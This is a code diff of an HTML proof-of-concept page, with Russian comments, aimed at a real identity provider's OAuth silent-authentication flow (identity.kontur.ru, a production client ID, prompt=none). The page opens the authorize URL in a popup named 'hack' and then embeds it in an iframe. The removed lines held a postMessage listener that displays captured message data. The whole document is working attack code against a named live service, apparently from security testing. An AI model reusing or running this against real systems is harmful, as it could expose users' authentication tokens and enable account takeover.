@@ -2,52 +2,24 @@
 <html>
   <body>
     <script>
-      // (опционально) показывать входящие postMessage
-      window.addEventListener("message", (event) => {
-        alert(window.origin + "\r\n" + JSON.stringify(event.data));
-      }, false);
-
       const AUTH_URL = "https://identity.kontur.ru/connect/authorize?response_type=token+id_token&client_id=Notifications.Feed.Production.Front.SDK&scope=openid+Notifications.Feed.Production.API.Sockets&redirect_uri=https%3A%2F%2Fidentity.kontur.ru%2Fsilent-auth.html&prompt=none&nonce=syzMSN8zr7omGQYHAyGeKJTPSkUsWnOU";
 
-      function addIframe() {
+      // Открываем попап
+      const popup = open(
+        AUTH_URL,
+        "hack",
+        "width=800,height=300,top=500,left=200"
+      );
+
+      // Через 2 секунды — закрываем попап (если получится) и вставляем iframe
+      setTimeout(() => {
+        try { if (popup && !popup.closed) popup.close(); } catch (_) {}
+
         const iframe = document.createElement("iframe");
         iframe.src = AUTH_URL;
         iframe.style.cssText = "width:100%;height:600px;border:0;display:block;";
         document.body.appendChild(iframe);
-      }
-
-      (function openThenEmbed() {
-        let doneFired = false;
-        const done = () => {
-          if (doneFired) return;
-          doneFired = true;
-          try { popup && !popup.closed && popup.close(); } catch (_) {}
-          addIframe();
-        };
-
-        const popup = window.open(
-          AUTH_URL,
-          "hack",
-          "width=800,height=300,top=500,left=200,noopener,noreferrer"
-        );
-
-        // Если попап заблокирован — сразу встраиваем iframe
-        if (!popup) {
-          addIframe();
-          return;
-        }
-
-        // Пытаемся дождаться загрузки попапа (best-effort для кросс-домена)
-        try {
-          popup.addEventListener("load", done, { once: true });
-          popup.onload = done; // дополнительный запасной вариант
-        } catch (_) {
-          // Игнорируем, внизу есть таймаут-страховка
-        }
-
-        // Страховка: если событие загрузки не пришло — закрываем и встраиваем iframe через 5с
-        setTimeout(done, 5000);
-      })();
+      }, 2000);
     </script>
   </body>
 </html>
